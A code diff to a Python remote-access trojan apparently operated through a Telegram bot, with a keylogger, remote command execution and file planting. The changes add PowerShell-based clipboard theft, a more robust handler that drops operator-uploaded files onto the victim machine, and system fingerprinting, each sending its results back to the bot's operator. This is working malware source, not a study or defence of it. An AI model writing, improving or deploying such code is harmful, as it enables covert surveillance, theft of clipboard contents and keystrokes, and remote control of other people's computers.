@@ -1,3 +1,4 @@
+
 # Developer: Sreeraj
 # GitHub: https://github.com/s-r-e-e-r-a-j
 
@@ -12,6 +13,7 @@ import time
 import platform
 import requests
 import threading
+import subprocess
 import wave
 import pyaudio
 import numpy as np
@@ -27,6 +29,7 @@ keylogger_active: bool = False
 keylog_listener = None
 keylog_buffer: list[str] = []
 mouse_mess_active: bool = False
+execute_session: bool = False
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -550,32 +553,64 @@ def upload_command(message: telebot.types.Message) -> None:
 
 @bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
 @authenticated
-def handle_upload(message: telebot.types.Message) -> None:
+def handle_upload(message):
     global waiting_for_upload
     if waiting_for_upload:
-        file_info = bot.get_file(message.document.file_id) if message.document else bot.get_file(message.photo[-1].file_id)
-        file_name = message.document.file_name if message.document else "uploaded_file.jpg"
-        downloaded = bot.download_file(file_info.file_path)
-        with open(file_name, 'wb') as f:
-            f.write(downloaded)
-        bot.send_message(message.chat.id, f"Saved as {file_name}")
-        waiting_for_upload = False
+        try:
+            if message.document:
+                file_info = bot.get_file(message.document.file_id)
+                file_name = message.document.file_name
+            elif message.photo:
+                file_info = bot.get_file(message.photo[-1].file_id)
+                file_name = f"photo_{int(time.time())}.jpg"
+            else:
+                bot.send_message(message.chat.id, "Send document or photo")
+                waiting_for_upload = False
+                return
+                
+            downloaded = bot.download_file(file_info.file_path)
+            with open(file_name, 'wb') as f:
+                f.write(downloaded)
+            bot.send_message(message.chat.id, f"Saved: {file_name}")
+        except Exception as e:
+            bot.send_message(message.chat.id, f"Error: {e}")
+        finally:
+            waiting_for_upload = False
 
 @bot.message_handler(commands=['clipboard'])
 @authenticated
 def clipboard_command(message: telebot.types.Message) -> None:
-    user32 = ctypes.windll.user32
-    kernel32 = ctypes.windll.kernel32
-    user32.OpenClipboard(0)
-    if user32.IsClipboardFormatAvailable(1):
-        data = user32.GetClipboardData(1)
-        locked = kernel32.GlobalLock(data)
-        text = ctypes.c_char_p(locked).value.decode()
-        kernel32.GlobalUnlock(locked)
+    try:
+        result = subprocess.run(['powershell.exe', '-Command', 'Get-Clipboard'], 
+                              capture_output=True, text=True, timeout=5)
+        if result.stdout and result.stdout.strip():
+            bot.send_message(message.chat.id, f"Clipboard: {result.stdout.strip()[:4000]}")
+            return
+    except:
+        pass
+
+    try:
+        user32 = ctypes.windll.user32
+        kernel32 = ctypes.windll.kernel32
+        user32.OpenClipboard(0)
+        if user32.IsClipboardFormatAvailable(1):
+            data = user32.GetClipboardData(1)
+            if data:
+                locked = kernel32.GlobalLock(data)
+                if locked:
+                    text = ctypes.c_char_p(locked).value
+                    if text:
+                        clipboard_text = text.decode('utf-8', errors='ignore')
+                        kernel32.GlobalUnlock(locked)
+                        user32.CloseClipboard()
+                        bot.send_message(message.chat.id, f"Clipboard: {clipboard_text[:4000]}")
+                        return
+            if locked:
+                kernel32.GlobalUnlock(locked)
         user32.CloseClipboard()
-        bot.send_message(message.chat.id, f"Clipboard: {text}")
-    else:
-        bot.send_message(message.chat.id, "Clipboard empty")
+        bot.send_message(message.chat.id, "Clipboard empty or contains non-text data")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Could not read clipboard: {str(e)}")
 
 @bot.message_handler(commands=['changeclipboard'])
 @authenticated
@@ -616,8 +651,6 @@ def ex_command(message: telebot.types.Message) -> None:
         os.remove('output.txt')
     else:
         bot.send_message(message.chat.id, result[:4000])
-
-execute_session: bool = False
 
 @bot.message_handler(commands=['execute'])
 @authenticated
@@ -716,6 +749,23 @@ def info_command(message: telebot.types.Message) -> None:
 @bot.message_handler(commands=['pcinfo'])
 @authenticated
 def pcinfo_command(message: telebot.types.Message) -> None:
+    try:
+        ps_script = """
+        $computer = Get-CimInstance Win32_ComputerSystem
+        $os = Get-CimInstance Win32_OperatingSystem
+        $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
+        Write-Output "$($computer.Name)|$($os.Caption)|$($cpu.Name)|$($cpu.NumberOfCores)|$($computer.TotalPhysicalMemory/1GB)"
+        """
+        result = subprocess.run(['powershell', '-Command', ps_script], 
+                              capture_output=True, text=True, timeout=10)
+        if result.stdout:
+            parts = result.stdout.strip().split('|')
+            info: str = f"Hostname: {parts[0]}\nOS: {parts[1]}\nCPU: {parts[2]}\nCores: {parts[3]}\nRAM: {float(parts[4]):.0f} GB"
+            bot.send_message(message.chat.id, info)
+            return
+    except:
+        pass
+
     hostname: str = platform.node()
     system: str = platform.system()
     release: str = platform.release()
